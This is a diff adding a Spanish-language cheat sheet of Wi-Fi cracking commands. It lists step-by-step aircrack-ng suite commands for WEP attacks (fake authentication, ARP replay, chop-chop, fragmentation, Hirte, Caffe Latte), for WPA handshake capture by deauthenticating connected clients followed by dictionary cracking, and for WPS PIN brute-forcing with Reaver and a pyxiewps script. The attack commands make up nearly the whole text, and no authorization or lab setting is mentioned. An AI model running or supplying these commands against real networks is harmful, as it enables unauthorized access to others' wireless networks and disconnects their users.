@@ -1,0 +1,71 @@
+WEP ->
+Suite Aircrack-ng usando Airmon-ng, Airodump-ng, Aireplay-ng y Aircrack-ng
+Wifite (Script automatizado)
+
+airmon-ng start [interfaz]
+airodump-ng [interfaz en monitor]
+airodump-ng -c [canal del AP] --bssid [bssid del AP] -w [fichero al que se va a escribir la captura .cap] [interfaz en monitor]
+aireplay-ng -9 (comprueba la inyección)
+aireplay-ng -1 (fakeauth) 0 (tiempo entre cada fakeauth) -e [essid del AP] -a [bssid del AP] -h [mac con la que queremos asociarnos al AP (si es una que sabemos que acepta el AP mejor) [interfaz en monitor]
+aireplay-ng -3 (captura y reenvía las peticiones arp) -x [velocidad de inyección] -b [bssid del AP] -h [mac que queremos usar] [interfaz en monitor]
+aircrack-ng -z [archivo .cap]
+
+
+Ataque chop-chop
+1. airmon-ng start <interfaz de red>
+2. airodump-ng --bssid <BSSID del AP> -c <canal del AP> -w <nombre del archivo donde se guardaran la captura> <interfaz>
+3. aireplay-ng -1 <tiempo entre cada asociación> -e <ESSID del AP> -a <BSSID del AP> -h <nuestra mac> <interfaz>
+4. aireplay-ng -4 -b <BSSID del AP> -h <nuestra MAC> <interfaz>
+5. tcpdump -s 0 -n -e -r <archivo .cap generado antes> HAY QUE FIJARSE EN LA IP QUE APARECE PARA USARLA LUEGO
+6. packetforge-ng -0 -a <BSSID del AP> -h <nuestra MAC> -k <ip dentro del rango> -l <ip obtenida antes> -y <archivo .xor obtenido antes> -w <archivo a reinyectar>
+7. aireplay-ng -2 -h <nuestra MAC> -r <archivo creado en el paso anterior> <interfaz>
+8. aircrack-ng <archivo de captura .cap>
+
+
+Ataque fragmentación
+1. airmon-ng start <interfaz de red>
+2. airodump-ng --bssid <BSSID del AP> -c <canal del AP> -w <nombre del archivo donde se guardaran la captura> <interfaz>
+3. aireplay-ng -1 <tiempo entre cada asociación> -e <ESSID del AP> -a <BSSID del AP> -h <nuestra mac> <interfaz>
+4. aireplay-ng -5 -b <BSSID del AP> -h <nuestra MAC> <interfaz>
+5. packetforge-ng -0 -a <BSSID del AP> -h <nuestra MAC> -k <ip dentro del rango> -l <ip obtenida antes> -y <archivo .xor obtenido antes> -w <archivo a reinyectar>
+6. aireplay-ng -2 -h <nuestra MAC> -r <archivo creado en el paso anterior> <interfaz>
+7. aircrack-ng <archivo de captura .cap>
+
+
+Ataque Hirte (Requiere de un cliente conectado al AP)
+1. airmon-ng start <interfaz de red>
+2. airodump-ng --bssid <BSSID del AP> -c <canal del AP> -w <nombre del archivo donde se guardaran la captura> <interfaz>
+3. airbase-ng -c <canal de AP objetivo> -e <ESSID del punto de acceso objetivo> -N -W 1 <interfaz>
+4. aircrack-ng <archivo de captura .cap>
+
+
+Ataque Caffe Latte (Requiere de un cliente conectado al AP)
+1. airmon-ng start <interfaz de red>
+2. airodump-ng --bssid <BSSID del AP> -c <canal del AP> -w <nombre del archivo donde se guardaran la captura> <interfaz>
+3. airbase-ng -c <canal de AP objetivo> -e <ESSID del punto de acceso objetivo> -L -W 1 <interfaz>
+4. aircrack-ng <archivo de captura .cap>
+
+
+Ataque a WPA
+1. airodump-ng --bssid <BSSID del AP> -c <canal del AP> -w <nombre del archivo donde se guardaran la captura> <interfaz>
+2. aireplay-ng -0 <paquetes a mandar al cliente objetivo> -a <mac del punto de acceso> -c <mac del cliente asociado al punto de acceso> <interfaz>
+3. aircrack-ng <archivo de captura .cap> (Para comprobar que está el handshake)
+
+
+WPS ->
+  Reaver -----> reaver -i [interfaz inalámbrica] -b [bssid del AP] -vv (añaden también -K 1, probar más parámetros)
+	Wifite (Script automatizado)
+
+	python pyxiewps-ES.py -p (Una vez que captura la información con Reaver intenta sacar el pin WPS del router) -a [Tiempo para enumerar APs con WPS] -t [Tiempo para recolectar info del AP] -c [Canal a usar] -P (Si se encuentra mas de un AP con WPS, preguntar a cual se quiere atacar. Si el pin WPS ya fue conseguido pregunta para atacar de nuevo) -o [Archivo de salida para datos] -f (Si se tiene éxito al averiguar el pin WPS, también tratar de averiguar la clave WPA)
+
+		python pyxiewps-ES.py -p -P -a 20 -t 180 -o prueba.txt -f
+
+WPA ->
+  https://www.cloudcracker.com/ (Necesario capturar handshake para subirlo)
+
+airmon-ng start [interfaz]
+airodump-ng [interfaz en monitor]
+airodump-ng -c [canal del AP] --bssid [bssid del AP] -w [fichero al que se va a escribir la captura .cap] [interfaz en monitor]
+Si hay algún cliente conectado, lo desautenticamos
+aireplay-ng -0 (desautenticar) 1 (veces que se mandará la desautenticación) -a [bssid del AP] -c [mac del cliente a desautenticar] [interfaz en monitor]
+aircrack-ng –w [diccionario] [archivo .cap]
